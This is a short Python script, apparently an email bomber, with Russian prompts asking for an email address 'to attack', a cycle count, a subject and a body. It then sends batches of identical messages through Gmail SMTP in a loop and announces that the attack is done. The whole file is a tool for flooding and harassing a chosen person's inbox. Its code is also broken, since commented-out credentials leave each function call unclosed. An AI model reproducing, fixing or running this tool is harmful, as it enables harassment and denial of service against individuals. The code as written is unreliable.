import email_to
import platform
import os
import time

if platform.system().lower()=="windows":
    os.system("cls")
    print ("\033[1;31m_________    __        __        ____        ________    __                                             \033[1;m")
    print ("\033[1;34m|########|  |##\      /##|      /####\      |########|  |##|              By YanLax                     \033[1;m")
    print ("\033[1;34m|##|____    |###\ __ /###|     /##/\##\        |##|     |##|                                            \033[1;m")
    print ("\033[1;34m|########|  |##| |##| |##|    /########\       |##|     |##|         ____   __       ____   __  ___     \033[1;m")
    print ("\033[1;31m|##|_____   |##|      |##|   /##/    \##\    __|##|__   |##|_______   |__| |  | |\/|  |__| |__  |__|    \033[1;m")
    print ("\033[1;31m|########|  |##|      |##|  /##/      \##\  |########|  |##########| _|__| |__| |  | _|__| |__  |  \    \033[1;m")

Gmail= input (" Введите почту для атаки : ")
#Mail = input (" Введите свою почту: ")
#password = input (" Введите пароль: ")
repeat = input (" Кол.во циклов: ")
Tema = input (" Тема: ")
Text = input (" Текст: ")

for x in range(int(repeat)):
    server = email_to.EmailServer('smtp.gmail.com', 587,# "Логин", "Пароль" )
    server.quick_email( Gmail, Tema, 
                [ Text ],
                 style='h1 {color: Red}')

    server = email_to.EmailServer('smtp.gmail.com', 587,# "Логин", "Пароль" )
    server.quick_email( Gmail, Tema, 
                [ Text ],
                 style='h1 {color: Red}')

    server = email_to.EmailServer('smtp.gmail.com', 587,# "Логин", "Пароль" )
    server.quick_email( Gmail, Tema, 
                [ Text ],
                 style='h1 {color: Red}')

    server = email_to.EmailServer('smtp.gmail.com', 587,# "Логин", "Пароль" )
    server.quick_email( Gmail, Tema, 
                [ Text ],
                 style='h1 {color: Red}')

    server = email_to.EmailServer('smtp.gmail.com', 587,# "Логин", "Пароль" )
    server.quick_email( Gmail, Tema, 
                [ Text ],
                 style='h1 {color: Red}')
    print ( " Цикл пройден " )







print (" Атака проведенна ")